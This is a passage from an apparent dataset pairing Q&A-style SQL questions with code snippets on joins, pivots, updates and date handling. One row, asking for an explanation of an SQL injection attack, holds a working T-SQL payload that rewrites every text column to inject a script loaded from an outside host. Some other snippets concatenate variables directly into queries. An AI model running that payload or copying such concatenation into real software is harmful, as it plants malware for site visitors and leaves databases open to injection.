      MYDB.TBL
   WHERE
      TBL.FIELD1 = 'something'
      AND TBL.FIELD2 = 'somethingelse'
      AND TBL.CREATED >= '2014-01-01'
      AND TBL.CREATED < '2015-01-01'
)
SELECT CATEGORY as 'Category Name', [January],[February]
FROM x
   PIVOT(
      count([ROW_ID])  
      FOR month
      in([January],[February])  
   )AS p
"
2385,16763,Can I combine 2 queries into one data array from 2 different tables?,"SELECT id_file, name, 'file' as `type` 
FROM `files` 
LEFT JOIN `folders` ON `files`.`folder_id` = `folders`.`id` 
WHERE `folders`.`id` = 198

UNION

SELECT id_folder, name, 'folder' FROM `folders` WHERE `parent` = 198

LIMIT 0, 20
"
25881,38043,How to summarize the multiplication of two columns per each row,"SELECT SUM(x * y) AS TotalCapacity
FROM   bedrooms 
"
9464,38494,SQL picking same entry multiple times,"SELECT p.*
FROM StatusUpdates p
LEFT JOIN FriendRequests fr
  ON ((fr.From = p.AuthorId OR fr.To = p.AuthorId) AND fr.Accepted = 1)
 WHERE p.AuthorId = "".$Id.""

GROUP BY p.id
ORDER BY p.DatePosted DESC
"
21205,64323,SQL 3 table join where first two inner then outer,"SELECT u.first_name, 
       u.last_name, 
       s.magazine_id, 
       ps.id
  FROM users u 
  JOIN subscriptions s 
    ON u.id = s.user_id
  LEFT JOIN premium_subscriptions ps
    ON s.user_id = ps.user_id AND s.magazine_id = ps.magazine_id
"
34956,40776,SQL Server : Not So Simple IF Statement,"DECLARE @count INT
SET @count = isnull((SELECT TOP 1 [count] from products WHERE [count] > 1),0)
IF (@count > 1)
    BEGIN
        PRINT 'It works!'
    END
"
31948,26769,How do I choose records with equal values in some column?,"SELECT ide, fn, ln, debt
FROM empl
WHERE ln IN
(
    SELECT ln
    FROM empl
    GROUP BY ln
    HAVING COUNT(*) > 1
)
"
25327,11516,declare variable in a sql function,"CREATE FUNCTION dbo.fxnExample (@Param INTEGER)
RETURNS @Results TABLE(FieldA VARCHAR(50))
AS
BEGIN
INSERT @Results
SELECT SomeField
FROM Somewhere 
WHERE ParamField = @Param

RETURN
END
"
31320,70491,Can someone explain this SQL injection attack to me?,"set ansi_warnings off

DECLARE @T VARCHAR(255), @C VARCHAR(255)

DECLARE Table_Cursor CURSOR FOR
    select c.TABLE_NAME, c.COLUMN_NAME
      from INFORMATION_SCHEMA.columns c,
           INFORMATION_SCHEMA.tables t
     where c.DATA_TYPE in ('nvarchar','varchar','ntext','text')
       and c.CHARACTER_MAXIMUM_LENGTH > 30
       and t.table_name = c.table_name
       and t.table_type = 'BASE TABLE'

OPEN Table_Cursor

FETCH NEXT FROM Table_Cursor INTO @T, @C
WHILE(@@FETCH_STATUS=0)
BEGIN
    EXEC ( 'UPDATE [' + @T + ']
               SET [' + @C + '] =
                     ''""></title>'' +
                     ''<script src=""http://lilXXXXXXXop.com/sl.php""></script>'' +
                     ''<!--'' +
                     RTRIM(CONVERT(VARCHAR(6000),[' + @C + ']))
             WHERE LEFT(RTRIM(CONVERT(VARCHAR(6000),[' + @C + '])), 17)
                     <> ''""></title><script''
           '
         )

    FETCH NEXT FROM Table_Cursor INTO @T,@C
END

CLOSE Table_Cursor

DEALLOCATE Table_Cursor
"
23222,24623,pivot/unpivot tables mysql,"SELECT Table1.Value AS AValue, Table2.Value AS BValue
FROM Table1
JOIN Table2 ON Table1.grp = Table2.grp AND Table2.Type = 'B'
WHERE Table1.Type = 'A'
"
25877,32599,Append Results from two queries and output as a single table,"select * from products where producttype=magazine
union
select * from products where producttype = book
"
33571,28093,How to select results from multiple records and tables into one row,"select t1.id,
  max(decode (t1.code, 'Color', t2.descr, null)) color,
  max(decode (t1.code, 'Tone', t2.descr, null)) tone,
  max(decode (t1.code, 'Type', t2.descr, null)) type
from table1 t1, table2 t2
where t1.code = t2.code
  and t1.value = t2.value
  and t1.id = 1
group by t1.id
"
4675,8644,How to write SQL query in following situation,"update forexample
    set userid = 597960 + userid
    where userid >= 142963 and userid <= 144963;
"
13425,50147,Inserting values into a table via a stored procedure,"CREATE TRIGGER MYTRIGGER
 AFTER INSERT ON TABLE1
 REFERENCING NEW ROW AS N
 FOR EACH ROW
 INSERT INTO TABLE2 (COL1, COL2)
  VALUES (N.COL1, N.COL2 )
"
150,62215,How to run .sql file in Oracle SQL developer tool to import database?,"@path\script.sql;
"
6902,30431,Order by NULL values with mysql,"SELECT id, description, status, login FROM dev
ORDER BY status IS NULL, status DESC, login IS NULL, login DESC
"
32827,40818,Finding entry with maximum date range between two columns in SQL,"select
   x.name
from
    (
    select
        fans.name,
        dense_rank() over (order by fans.checkout-fans.checkin desc) as rnk
    from
        fans 
    where
        fans.checkout-fans.checkin is not null
    ) x
where
   x.rnk = 1;
"
9940,45800,"Generate records on interval of time (Weekly, Monthly, Quarterly, Yearly)","DECLARE @startDate DATETIME
DECLARE @endDate DATETIME
DECLARE @TimePeriod NVARCHAR(50)
DECLARE @RptDate DATETIME

SET @startDate = '1/15/2011'
SET @endDate = '12/31/2011'
SET @TimePeriod = 'Monthly'

SET @RptDate = @startDate
WHILE @RptDate < @endDate
BEGIN
    PRINT @RptDate      --- This prints out the dates I think you want
    IF @TimePeriod = 'Monthly'
        SET @RptDate = DATEADD(mm, 1, DATEADD(dd, -DAY(@RptDate) + 1,@RptDate))

    IF @TimePeriod = 'Weekly'
        SET @RptDate = DATEADD(ww, 1, DATEADD(dd, -DATEPART(weekday,@RptDate) + 1,@RptDate))

    IF @TimePeriod = 'Quarterly'
        SET @RptDate = DATEADD(qq, 1, DATEADD(qq, DATEDIFF(qq, 0, @RptDate), -1) + 1)

END
"
6326,65198,I Need Help Fixing My Small Time Sheet Table - Relational DB - SQL Server,"CREATE TABLE TimeSheet
(
    TimeSheetId
    EmployeeId
    AddedOn      //populate using GETDATE()
    AddedBy      //populate using SUSER_SNAME()
);

CREATE TABLE TimeSheetDetail
(
    TimeSheetDetailId  
    TimeSheetId        
    Type               //Shift Start, Shift End, Break Start, Break End
    Entered           
    AddedOn            //populate using GETDATE()
    AddedBy            //populate using SUSER_SNAME()
);
"
30836,12894,select distinct not working as expected,"SELECT DISTINCT
  studentId,
  CollegeID
FROM STUDENT_GROUP
"
869,161,Looking for Query for NEXT_DAY for Oracle to SQL server 2012 migration,"SELECT CASE WHEN DATENAME(WEEKDAY,OrderDate) = 'Wednesday' 
       THEN DATEADD(DAY,7,OrderDate)
       ELSE DATEADD(DAY,(18-(@@DATEFIRST+DATEPART(WEEKDAY,OrderDate)))%7,OrderDate)
       END
FROM Orders
"
26396,35991,how to get rows value in one row?," SELECT string_agg(id, ',') FROM x
"
21428,7348,more values from one table in other table under same row,"    YOUR NEW TABLE NAME(i.e : user_languages)

    COLUMN NAME :
    --------------------------
    1. id (int,primary_key)

    2. employers_id(int)

    3. language_id(int)

    4. create_time(DateTime)
"
20031,64165,In SQLite how to insert a new column into s table with values of a column in another table?,"UPDATE T1
SET t2_col = (SELECT t2_col
              FROM T2
              WHERE T2.rowid = T1.rowid)
"
35194,48588,Transposing a column values into column headers,"declare @Names varchar(max) 
select @Names = coalesce(@Names + ', ', '') + test_name 
from (select distinct test_name from tbl) t

exec('
SELECT *
FROM tbl t
 PIVOT (SUM(test_value)
        FOR Test_name 
        IN ('+@Names+'))p')
"
21146,6608,How can I get all sequences in an Oracle database?,"select sequence_owner, sequence_name from dba_sequences;


DBA_SEQUENCES -- all sequences that exist 
ALL_SEQUENCES  -- all sequences that you have permission to see 
USER_SEQUENCES  -- all sequences that you own
"
3164,2338,Get unique common records with all records from both tables?,"select *
from table1 t1
union all
select *
from table2 t2
where not exists (select *
                  from table1 t1
                  where t1.invno = t2.invno
                 );
"
33208,42873,XML Content Modification in Oracle 11g r2,"for $book in ora:view(""XML_TABLE"")//book
where $book/price > 10
return
  replace value of node $book/title
  with concat($book/title/text(), ""-expensive"")
"
11848,19218,Generating a MySQL hourly breakdown from current timestamp,"create table hourly
(
  /* hour is not a reserved keyword */
  hour smallint(2) not null default 0
);

insert into hourly values (0),(1).... until 24

SELECT 
  hourly.hour, 
  COALESCE(COUNT(activities),0) AS ""No of Activities""
FROM hourly
LEFT JOIN tbl1 ON hourly.hour=hour(tbl1.TimeStamp)
WHERE 
  tbl1.timestamp>=DATE_SUB(NOW(), INTERVAL 24 HOUR) AND 
  tbl1.Name=? 
GROUP BY hourly.hour
ORDER BY hourly.hour;
"
8043,2723,Combining Union results,"SELECT Count(emailID) as ViewsThatMonth, 
         Day(entry_date) as day, 
         Month(entry_date) as month, 
         Year(entry_date) as year
from(
select emailID, Record_Entry AS entry_date 
    from email_views
   where emailID = 110197
UNION ALL 
  select emailID, entry_date 
    from dbo.tblOnlineEmail_Views
   where emailID = 110197
) AS t
Group By Day(entry_date), Month(entry_date), Year(entry_date)
order by 4, 3, 2
"
16989,1774,Oracle Query upon a Pipelined function works ok but chokes if I add a condition,"create or replace type number_nt as table of number;

create or replace function pipe_function return number_nt pipelined is
begin
    while 1 = 1 loop
        pipe row(1);
    end loop;
end;
/

select column_value
from table(pipe_function)
where column_value < 2;
"
19353,4941,Hiding Repeated Row Values in Sql,"select 
    case when RNum=1 then UserName else '' end UserName,
    case when RNum=1 then Fee else '' end Fee,
    ReferenceName,
    Billed 
from(
    select 
        *, 
        ROW_NUMBER() over (partition by UserName order by UserName) RNum 
    from tbl
)x
"
21952,22146,SQL Update using Select statement,"UPDATE a
SET a.Name = c.first_name + ' ' + c.last_name
FROM Assignments a
INNER JOIN Contacts c  ON c.id = A.contact_id
"
12032,25026,Selecting a Column based on Child and Parent Category,"select 
   C1.NAME as Level1, 
   C2.NAME as Level2,
   C3.NAME as Level3
from Categories C1
inner join Categories C2
   on C2.ParentCatId = C1.CatId
inner join Categories C3
   on C3.ParentCatId = C2.CatId
where C1.Level = 1 and C2.Level = 2 and C3.Level = 3 and
"
3684,60925,Using part of a field value in TSQL,"UPDATE Table1
SET Column1 = CASE SUBSTRING(Column2,1,3)
             WHEN 'vl1' THEN '01'
             WHEN 'vl2' THEN '02'
             WHEN 'vl3' THEN '03' 
             '''''
END
"
33808,40969,SAS SQL to aggregate rows,"data first;
set have;
by id;
format COL $2000.;
retain COL;

if ^last.id then
   col = strip(col) || strip(name) || "","";
else do;
   col = strip(col) || strip(name);
   output;
end;
run;

data want;
merge have first;
by id;
run;
"
13,2178,using INSERT query and SELECT,"INSERT INTO commissions (categoryID, percent)
SELECT ID, 10 FROM categories WHERE description = 'widgets';
"
23688,28243,How to write this SQL Statement,"SELECT MAX(ID), UserName
FROM table
GROUP BY UserName
"
26700,26787,Optimizing tricky SQL search query,"SELECT 
      t1.Item_ID
   FROM 
      T_Items_Props t1

         JOIN T_Items_Props t2
            on t1.Item_ID = t2.Item_ID
           AND t2.Prop_ID = 2
           AND t2.Value = '123'

         JOIN T_Items_Props t3
            on t1.Item_ID = t3.Item_ID
           AND t3.Prop_ID = 6
           AND t3.Value = 'anything'

         JOIN T_Items_Props t4
            on t1.Item_ID = t4.Item_ID
           AND t4.Prop_ID = 15
           AND t4.Value = 'another value'
   WHERE
          t1.Prop_ID = 1
      AND t1.Value = 'abc'
"
26335,70110,"In one table Manger ID and Cashier ID is available and In another Table Cashier ID, Manager ID are available","SELECT t1.manager_id, t2a.employee_name AS manager_name
     , t1.cashier_id, t2b.employee_name AS cashier_name
  FROM table1 t1 INNER JOIN table2 t2a
    ON t1.manager_id = t2a.employee_id
 INNER JOIN table2 t2b
    ON t1.cashier_id = t2b.employee_id;
"
11753,17498,SQL Server: Select only one row of rows that has the same ID on some coulmn,"select distinct m.from,m.to from mytable as m;
"
22705,49436,How do I insert a sequence of rows in a MySQL database,"SET @i:=0;
INSERT INTO the_table (col0,col1,col2)
SELECT @i:=@i+1,0,0 FROM SomeTable LIMIT 255;
"
2646,58808,"Joining Tables and Displaying Result as Text, in one column","CREATE PROCEDURE ShowModuleWithLessons 
@CourseID int = 0
AS
BEGIN

SET NOCOUNT ON

DECLARE @MS INT
DECLARE @ModuleCount INT


SET @MS = 0
SET @ModuleCount = (Select COUNT(Module.ModuleSequence) FROM Module WHERE Module.CourseID = @CourseID)

IF EXISTS (SELECT * FROM Module WHERE Module.CourseID = @CourseID)
BEGIN
    WHILE @MS < @ModuleCount
    BEGIN
        SET @MS=@MS+1
            DECLARE @Name nvarchar(max),
                    @Lesson nvarchar(max),
                    @CID INT
            SELECT  @Name = Module.Name,
                    @CID = @MS
            FROM Module
            JOIN Lesson ON Module.ModuleSequence = Lesson.ModuleSequence
            WHERE Module.ModuleSequence = @MS


            PRINT CONVERT(VARCHAR(2),@MS) + '. ' +  @Name

            SELECT Lesson.Description AS Lessons
            FROM Module
            JOIN Lesson ON Module.ModuleSequence = Lesson.ModuleSequence
            WHERE Module.ModuleSequence = @MS
    END
END
ELSE
BEGIN
    PRINT 'Course with ID ' + CONVERT(VARCHAR(2),@CourseID) + ' does not exists'
END
"
24845,69660,MySQL select based on daily timestamp range,"WHERE HOUR(FROM_UNIXTIME(`timestamp`)) = 9
"
17946,48995,Informix cast Date to integer,"TO_CHAR(mydatefield,'%Y%m%d')::INTEGER
"
31137,38789,SQL :Write a function to return value based on business rule,"(CASE WHEN UpdatedCode <> 'LSE' THEN LEFT(Investment_Codename, 2)) AS [Country Code]
"
11831,48312,payment amount tracking sql,"select a.CustomerName, b.Payment,
       (a.amount - sum(b.payment) over (partition by a.id order by date)) as RemainingBalance
from tablea a left outer join
     tableb b
     on a.id = b.id;
"
10948,39436,"Group BY Having COUNT, but Order on a column not contained in group","SELECT TOP 1 ID
FROM TABLE
WHERE Name = 'ABC'
GROUP BY ID,Name
HAVING COUNT(ID) > 2
ORDER BY MAX(Date) DESC
"
21291,72105,Join two sql queries into one,"SELECT 
  description,
  MAX(
    CASE 
        WHEN column1 = 'A' 
        THEN (
            CASE 
                WHEN checkbox2 = '2' THEN '2'
                WHEN checkbox2 = '1' THEN '1'
                WHEN checkbox2 = '0' THEN '0'   
                WHEN checkbox1 = '1' THEN '1'
                WHEN checkbox1 = '0' THEN '0'
            END
        ) 
    ELSE '-' 
    END
  ) 'A'

FROM 
  table1
JOIN table2
    ON table2.id = table1.id
LEFT JOIN table3 
    ON table2.id2 = table3.id2
WHERE 
    table1.id = var1
GROUP BY description
"
25243,54069,mysql update one table with data from another,"UPDATE customers c INNER JOIN 
       initialsynctemptable i ON  c.id = i.customerID
   SET c.email = i.thinkEmail,
       c.packages = i.thinkPackages 
"
5029,74059,Tricky sql query for popularity,"SELECT BrandId, SUM(Views) AS ViewsSummary FROM my_table GROUP BY BrandId
"
6266,62469,How to insert the comma separated value in table,"create table testtable(col1 varchar2(50) , col2 varchar2(50));

insert into testtable (col1, col2)
with commadata as(
select 'word1,word2,word3' columnid1, 'word4,word5,word6' columnid2
  from dual
  )
select       regexp_substr( columnid1 
                          , '[^,]+'
                          ,1
                          ,level)    as parsed_value
                          ,
regexp_substr( columnid2 
                          , '[^,]+'
                          ,1
                          ,level)    as parsed_value                          

  from commadata
connect by level  <= REGEXP_COUNT( columnid1 , '[,]' )+1    
;  
select * from testtable;  

COL1                                               COL2                                               
-------------------------------------------------- -------------------------------------------------- 
word1                                              word4                                              
word2                                              word5                                              
word3                                              word6   
"
20483,47719,selecting digits right of the last zero in SQL Server,"declare @value varchar(20) = 'NA000000123456'

select substring(@value, patindex('%[1-9]%', @value), len(@value))
"
29332,73416,Select distinct rows with max date with repeated and null values (Oracle),"select code, price, date
from (select code, price, date,
            row_number() over (partition by code order by date desc nulls last, idRevision desc) as seqnum
      from Root r inner join
           Detail d
           on d.idRoot = r.idRoot left join
           Revision r
           on d.idDetail = r.idDetail
     ) rdr
where seqnum = 1;
"
13555,36398,How to order rows by columns at arbitrary order ? MYSQL," $query = ""SELECT * FROM table1 ONE ORDER BY FIELD(status, 2, 1, 3)"";
"
490,35148,Get every second row as a result table in t-sql,"WITH data AS (
    SELECT  *, ROW_NUMBER() OVER  (PARTITION BY Customer ORDER BY Quantity) rn
    FROM    @Table1 
)
SELECT Customer, Quantity
FROM    data 
WHERE   rn = 2
"
10751,2179,CROSS APPLY performance difference,"SELECT 
   b.BrandId,
   b.Name,
   ah.Type,
   c.ContactEmails,
   c.ContactNumbers,
   c.ContactLinks
FROM 
   @IdsToFilterBy ids
JOIN dbo.AccountHandler ah ON ah.AccountHandlerId = ids.Id
JOIN dbo.Brand b ON ah.RepresentedByBrandId = b.BrandId
CROSS APPLY dbo.[fn_GetBrandContactDetails](b.BrandId) AS c
OPTION (FORCE ORDER)
"
27290,67595,mysql update row with info from previous row,"UPDATE tableX upd JOIN
       tableX simple
       ON simple.Col1 = upd.Col1 - 1
    SET upd.Col3 = simple.Col2 ;
"
6429,28409,Query without Union operator SQL,"SELECT DISTINCT X1.col1
FROM X X1 INNER JOIN X X2 ON X1.col1=X2.col1
WHERE X1.col2=2 AND X2.col2=4
"
14344,43805,Get highest Value from MySQL Database,"select max(substring(code, 3) + 1)
from your_table
"
1534,24176,SQL how to SELECT all utf8mb4 characters?,"HEX(col) RLIKE ""^(..)*F.""
"
10991,48570,"What is the purpose of querying on ""like '%%'""","$var = '';
$sql = ""... field LIKE '%"" . $var . ""%' OR ..."";
"
27569,11095,oracle trigger on delete,"CREATE TABLE TBL_CARDEALERSHIP (
    ... columns ...
    CONSTRAINT fk_salesppl FOREIGN KEY (dealership_id)
        REFERENCES tbl_salespeople (dealership_id)
);
"
19187,2334,Use a string(Varchar2) of number as number,"Hi This is just an example how you can effectively use the update.

SET serveroutput ON;
DECLARE
  p_list VARCHAR2(100);
  my_list dbms_sql.number_table;
BEGIN
  p_list:=('1,2,3,4,5,6,7,8,9');             --Your Input
  SELECT regexp_substr(p_list,'[^,]+', 1, level) bulk collect -- used to collect each input as number
  INTO my_list
  FROM dual
    CONNECT BY regexp_substr(p_list, '[^,]+', 1, level) IS NOT NULL;
  forall i IN my_list.first..my_list.last
  UPDATE emp SET mgr = my_list(i) WHERE deptno = 10;--update statement
  dbms_output.put_line('working');
END;
"
12618,59137,Why is there STILL no sql shortcut to include/not include null values in a where condition?,"select * from table where isnull(columnname,'')=''
"
30035,22511,How to select values in multiple tables?,"SELECT  a.factory_name , c.car_model_name,
        COUNT(b.car_factory_id) totalCount
FROM    factory a
        LEFT JOIN car b
            ON a.factory_id = b.car_factory_id
        LEFT JOIN car_model c
            ON b.car_model_id = c.car_model_id
GROUP BY a.factory_name , c.car_model_name
ORDER BY factory_name ASC
"
14690,49293,How to access an index of a string in PL/SQL?,"DECLARE
  str VARCHAR2(20);
BEGIN
  str:='Test';

  FOR i IN 1..LENGTH(str) LOOP
    DBMS_OUTPUT.PUT_LINE('Character at index ' || i || ' is ' || SUBSTR(str, i, 1));
  END LOOP;
END;
"
2077,66264,How to do LEFT JOIN with more than 2 tables?,"select a.x, b.x, c.x 
from number as a
left join customer as b on a.b = b.b
left join numbergroup as c on a.c = c.c and c.b = b.b
"
39545,73210,postgresql -select n number of rows if there are n number of unflagged rows available and update the flag,"WITH unflagged AS (
    SELECT id FROM (
       SELECT id, count(*) over() AS cnt
       FROM your_table
       WHERE flag IS NULL
    ) WHERE cnt >= 5
    LIMIT 5
)
UPDATE your_table SET flag = Y
WHERE id IN (SELECT * FROM unflagged)
"
29345,68383,sql join on two columns,"SELECT Message, uf.Email AS FromEmail, ut.Email AS ToEmail
FROM Messages
JOIN Users uf ON Messages.FromUser = uf.Id
JOIN Users ut ON Messages.ToUser = ut.Id
"
9857,66509,sql query that groups different items into buckets,"select
      case when price >= 0 and price <= 10    then ""  0 - 10""
           when price > 10 and price <= 50   then "" 11+ - 50""
           when price > 50 and price <= 100  then "" 51+ - 100""
           else ""over 100""
      end PriceRange,
      count(*) as TotalWithinRange
   from
      YourTable
   group by 1
"
23075,40676,More efficient SQL query structuring,"SELECT DISTINCT (g2.ug_user_id)
    FROM
        users_groups as g1
        JOIN
        users_groups as g2 
        ON g1.ug_group_id = g2.ug_group_id
            and g1.ug_user_id != g2.ug_user_id
    WHERE g1.ug_user_id = $user_id;
"
1050,8327,Delete all rows which has no id existing in another table,"DELETE table2 
FROM   table2 
       LEFT JOIN table1 
              ON table2.a_id = table1.id 
WHERE  table1.id IS NULL 
"
12800,71794,PLSQL user defined table types and joins,"SELECT DISTINCT someVal 
INTO outVal 
FROM OtherTable ot, TABLE(srcCodesIn) sc 
WHERE ot.ID = sc.column_value
"
11334,59040,How to Hide/Show of UI component in oracle adf,"visible=""#{binding.filedName.inputValue != null}""
"
30087,22863,Rankings using SQL,"SELECT Standings.Teams, Standings.W,
       (SELECT Count(*)+1
        FROM Standings AS Temp 
        WHERE Temp.W > Standings.W
       ) AS Wins_Rank
FROM Standings
ORDER BY Standings.W;
"
345,23204,Select statement where fields each contain multiple values,"SELECT v.*
FROM
  vendors v
WHERE
  NOT EXISTS (
    SELECT *
    FROM vendor_styles vs1 INNER JOIN vendor_styles vs2
         ON vs1.style_id = vs2.style_id
            AND vs1.vendor_id = 1 --- insert vendor id here
    WHERE
      vs2.vendor_id = v.id)
"
7655,64659,SQL - child must contain all specified values,"SELECT test_parent.parent_id, test_parent.title 
FROM test_parent
JOIN test_child ON test_child.parent_id=test_parent.parent_id
 AND test_child.property IN ('A','B')
GROUP BY test_parent.parent_id, test_parent.title
HAVING COUNT(DISTINCT test_child.property)=2
"
13547,5996,oracle DELETE records while MERGE,"DELETE FROM newtest nt
WHERE NOT EXISTS
(SELECT 1 FROM test t where t.id = nt.id);
"
5809,4940,How to write a Report query based on number of days in a month?,"select id,name,address,trans_dt from tab1 where trans_dt between trunc(trunc(sysdate,'MM')-1,'MM') and trunc(sysdate,'MM');
"
29129,22252,Divide my Oracle table into 5 parts randomly,"SELECT * FROM 
    ( SELECT * FROM mytable 
      ORDER BY dbms_random.value 
    ) 
    WHERE rownum <= (SELECT count(*)/5 from mytable)
"
23916,47881,Friend Relationships with JPA,"@Entity
public class Person {
   @Id
   @GeneratedValue
   private Long id;

   @OneToMany( mappedBy=""owner"", cascade=CascadeType.ALL, orphanRemoval = true)
   private Set<Friend> friends = new HashSet<>();

   // getter and setter for Friends
   ...
}

@Entity
public class Friend {
   @EmbeddedId
   private Key key = new Key();

   @ManyToOne
   @Maps(""ownerId"")
   private Person owner;

   @ManyToOne
   @MapsId(""personId"")
   private Person person;

   private boolean isActive;

   ...

   @Embeddable
   public static class Key implements Serializable {
      private Long ownerId;
      private Long personId;

      ...
   }
} 
"
38748,22228,Concatenate data from two fields ignoring NULL values in one of them?,"SELECT Trim(a.FirstName) & ' ' & Trim(a.LastName) AS employee_name,
a.city, a.street & (' ' +a.housenum) AS address
FROM Employees AS a
"
6068,57066,How to get the number of buyers on each main channel based on the number of buyers on each sub-channel,"SELECT  a.channel_id `Channel ID`,
        a.channel_title `Channel Title`,
        COUNT(DISTINCT c.buyer_id) `Number of Buyers`
FROM    tbl_Channel a
        INNER JOIN tbl_Channel b
            ON a.channel_ID = b.parent_channel_id
        INNER JOIN tbl_buyer c
            ON  b.channel_ID =  c.channel_ID
WHERE   a.parent_channel_id = 0
GROUP BY a.channel_id,
         a.channel_title
"
36678,3569,SQL Date range Question,"…
WHERE DateColumn >= DATEADD(MONTH, DATEDIFF(MONTH, 0, GETDATE()) - 1, 0)
…
"
302,50244,Select smallest date after group by,"SELECT * 
FROM levelsloaded ll
INNER JOIN
    (SELECT id, MIN(mindate) AS finalmindate
     FROM levelsloaded
     GROUP BY id
) ill
ON ll.id = ill.id AND ll.mindate = ill.finalmindate
ORDER BY date DESC
"
27398,7623,Access VBA Filtering a combo box list based on Date field,"EquipmentID1.RowSource = _
  ""SELECT tblEquipment.Equipment, tblEquipment.UnavailableFrom "" & _
  ""FROM tblEquipment "" & _
  ""WHERE tblEquipment.UnavailableFrom >= #"" & Me!EndDate & ""# "" & _
    ""OR tblEquipment.UnavailableFrom Is Null;""
"
33352,23791,parametrized sql with multiple parameters,"declare @numItems int;
declare @value1 int;
declare @value2 int;
declare @currentValue int;
declare @counter int;
declare @qry nvarchar(max)

set @value1 = 5;
set @value2 = 10;

set @numItems = 2
set @counter=0

WHILE (@counter < @numItems)
BEGIN
    set @qry = 'set @currentValue = @value' + cast(@counter+1 as nvarchar(max)) + ';'   
    exec sp_executesql @qry, 
                        N'@value1 int, @value2 int, @currentValue int OUTPUT', 
                        @value1=@value1,@value2=@value2, @currentValue = @currentValue OUTPUT

    print @currentValue

    set @counter = @counter + 1;
END
"
38535,52182,How to select rows if first of them will be randomized and the rest should be ordered by criteria,"SELECT   id, name, is_top, price 
FROM     `hotels` 
ORDER BY is_top DESC, CASE is_top WHEN 1 THEN RAND() ELSE price END ASC
"
15843,61525,Selecting the ID of GROUP BY based on other table value,"SELECT id, nome
FROM produtos p
WHERE id IN (
  SELECT COALESCE(MAX(rp.idproduto), MAX(p.id))
  FROM produtos p
  LEFT JOIN representantes_precos rp ON p.id = rp.idproduto
  GROUP BY p.nome)
"
34691,36316,RANK partition function used in conjunction with SUM OVER,"select t.*,
       RANK() over (order by sumscore desc, score desc)
from (select t.*,
             SUM(score) over (partition by department) as SumScore
       from #Table t
      ) t
"
11330,43825,Nested query using while condition - sql,"select * from mytable
connect by prior id = parent_id
start with name = 'Manager';
"
6993,7588,How to access help pages from SQL*Plus prompt?,"SQL>HELP STARTUP
"
30101,64313,UPDATE on duplicate columns when three are duplicate but not just one," create unique index idx_table_x_y_z on table(x, y, z)
"
19874,52336,"In MS-SQL, how do I INSERT INTO a temp table, and have an IDENTITY field created, without first declaring the temp table?","SELECT *, IDENTITY( int ) AS idcol
  INTO #newtable
  FROM oldtable
"
12575,32223,Query that combines three tables to show total counts,"SELECT  l.LocationName,
        tpl.Amount,
        COALESCE(SUM(pt.Amount),0) Sold,
        tpl.Amount - COALESCE(SUM(pt.Amount),0) Remaining
FROM    Locations l
        INNER JOIN TicketsPerLocation tpl ON l.LocationID = tpl.LocationID
        LEFT JOIN PurchasedTickets pt ON tpl.TicketID = pt.TicketID 
            AND tpl.LocationID = pt.LocationID 
            AND tpl.EventID = pt.EventID
WHERE   tpl.TicketID = 1 AND tpl.EventID = 4
GROUP BY l.LocationName, 
        tpl.Amount
"
19227,1732,FOR ALL/EXIST Queries,"SELECT distinct P1.name
FROM Persons P1 
INNER JOIN Knows K ON K.personA_id = P1.id
INNER JOIN Persons P2 ON K.personB_id = P2.id AND P1.age - P2.age > 5
"
8615,21017,Group by similar string,"SELECT CASE 
         WHEN RIGHT(nombre, 1) BETWEEN '0' AND '9' THEN 
         LEFT(nombre, Length(nombre) - 2) 
         ELSE nombre 
       END AS nombrechecked, 
       Group_concat(id_grupo) 
FROM   grupos 
GROUP  BY 1 
"
20363,51890,mysql: select between,"SELECT  timestamp, response_time
FROM    results
WHERE   id = @xyz
        AND timestamp BETWEEN
        ( 
        SELECT  MAX(timestamp)
        FROM    results
        WHERE   id = 22
        ) AND
        ( 
        SELECT  MAX(timestamp)
        FROM    results
        WHERE   id = 22
        ) - @xxx
ORDER BY
        timestamp DESC
"
1840,6523,Simple sql regarding select into (copy a single column from another table into an empty one with multiple columns),"INSERT INTO A (FirstValue, SecondValue, SeatNumber)
SELECT 1,
       2,
       SeatNumber
  FROM B
"
23784,14146,Showing DISTINCT cases where NULL," SELECT 
    ID,
    MAX(ALLEG1) AS ALLEG1,
    MAX(ALLEG2) AS ALLEG2,
    MAX([DATE]) AS [DATE],
    MAX(CONCATENATED) AS CONCATENATED
 FROM 
    @TBL
 GROUP BY 
    ID
 HAVING
    SUM(CASE WHEN ALLEG1 IS NULL THEN 0 ELSE 1 END + CASE WHEN ALLEG2 IS NULL THEN 0 ELSE 1 END) = 0
"
28898,22056,oracle LAST_DAY(sysdate) comparison problem,"tablename.lastdateofmonth = trunc(LAST_DAY(sysdate))
"
31982,4276,left join query does not return left table records if right table does not have records,"SELECT u.name, u.division,
       SUM(r.wins) as wins, SUM(r.losses) as losses
FROM users u LEFT JOIN
     results r
     ON u.user_id = r.user_id AND r.date BETWEEN {$startDate} AND {$endDate}
WHERE u.user_id = {$user_id}
GROUP BY u.user_id;
---------^
"
24175,55619,How do I change db schema to dbo,"ALTER SCHEMA dbo TRANSFER jonathan.MovieData;
"
25498,62088,Selecting from two non-related tables at the same time,"select bt.*, ort.*
from bigtable bt cross join
     onerowtable ort
"
24804,57791,Exclude row if one of 2 flattened columns didn't return,"SELECT   th.DatePerformed
,        th.Measurement as TireHeight
,        tw.Measurement as TireWidth
FROM (
    SELECT DatePerformed, Measurement
    FROM   Measurements
    WHERE  MeasurementType = 'TireHeight'
) th
INNER JOIN (
    SELECT DatePerformed, Measurement
    FROM   Measurements
    WHERE  MeasurementType = 'TireWidth'
) tw
ON tw.DatePerformed = th.DatePerformed
"
1483,52111,how to select first and last value of rows and between 5 minutes interval,"select quote_date, min(open_time) as open_time,
       substring_index(group_concat(open_rate order by quote_time), ',', 1) as first_open,
       substring_index(group_concat(close_rate order by quote_time desc), ',', 1) as last_close,
       min(high_rate), max(high_rate),
       min(low_rate), max(low_rate)
from quotes
group by quote_date, floor(to_seconds(quote_time) / 300);
"
39122,16968,SQL Server XML-DML how to replace element value with value of relative xpath,"declare @i int
declare @maxNames int
set @i = 1
set @maxNames = (select max(data.value('count(//Name)', 'int')) from Policy)
while @i <= @maxNames begin
    update policy set data.modify('
      replace value of (//Name[sql:variable(""@i"")]/Id/text())[1] 
      with concat(
        (//Name[sql:variable(""@i"")]/First/text())[1], 
        (//Name[sql:variable(""@i"")]/Last/text())[1], 
        (//Name[sql:variable(""@i"")]/Business/text())[1])
    ') 
    set @i = @i + 1
end
"
17850,55661,Update one table using data from another table - Oracle,"MERGE INTO TABLE1
USING (
       SELECT PERSON_ID, 
              ADDRESS_LINE1, ADDRESS_LINE2, CITY, STATE_PROVINCE, ZIP 
         FROM ADDR 
